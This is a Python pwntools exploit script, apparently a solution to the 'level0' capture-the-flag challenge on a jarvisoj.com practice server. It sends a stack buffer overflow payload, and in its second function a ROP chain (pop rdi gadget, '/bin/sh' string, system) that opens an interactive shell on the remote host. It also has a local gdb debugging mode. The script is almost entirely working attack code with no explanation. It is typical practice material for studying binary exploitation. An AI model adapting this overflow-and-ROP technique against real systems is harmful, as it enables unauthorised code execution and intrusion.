#!/usr/bin/python

from pwn import *

def exploit():
    global io
    system_addr = 0x0000000000400596
    
    payload   = 'A' * 0x80
    payload  += 'A' * 0x8        # ebp 
    payload  += p64(system_addr)  # system_addr
    
    sleep(0.5)
    io.sendline(payload)
    
    # get shell
    io.interactive()

def exploit2():
    global io
    system_addr = 0x0000000000400460
    binsh_addr  = 0x0000000000400684
    gadget_addr = 0x0000000000400663
    
    payload   = 'A' * 0x80
    payload  += 'A' * 0x8         # ebp 
    payload  += p64(gadget_addr)  # pop rdi;ret
    payload  += p64(binsh_addr)   # system_addr
    payload  += p64(system_addr)   # system_addr

    
    sleep(0.5)
    io.sendline(payload)
    # get shell
    io.interactive()

if __name__ == '__main__':
    target_elf = './level0'
    #target_libc = './libc-2.23.so'

    target_host = 'pwn2.jarvisoj.com'
    target_port = '9881'

    context.log_level = 'debug'
    #context.terminal = ['tmux', 'splitw', '-v']

    elf = ELF(target_elf)
    #libc = ELF(target_libc)

    LOCAL = True
    LOCAL = False

    if LOCAL:
        #io = process(target_elf, env={'LD_PRELOAD':target_libc})
        io = process(target_elf)
        gdb.attach(io, 
        '''b *0x00000000004005BF
        b *0x00000000004005A6''')
    else:
        io = remote(target_host, target_port)
    
    exploit2()


